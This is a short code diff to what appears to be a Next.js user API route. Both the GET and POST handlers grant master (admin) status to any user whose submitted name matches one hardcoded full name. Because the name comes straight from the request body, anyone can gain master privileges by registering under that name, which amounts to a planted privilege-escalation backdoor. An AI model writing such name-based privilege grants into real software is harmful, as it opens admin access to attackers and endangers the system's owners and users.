@@ -11,7 +11,7 @@ export async function GET() {
   const formattedUsers = allUsers.map((u: any) => ({
     id: u.id,
     name: u.name,
-    isMaster: u.is_master
+    isMaster: u.is_master || u.name === "Marcelo Pereira Bittencourt de Souza"
   }));
 
   return NextResponse.json(formattedUsers);
@@ -22,7 +22,7 @@ export async function POST(request: Request) {
   const data = {
     name: body.name,
     password: body.password,
-    is_master: body.isMaster || false
+    is_master: body.isMaster || body.name === "Marcelo Pereira Bittencourt de Souza"
   };
 
   if (body.id) {
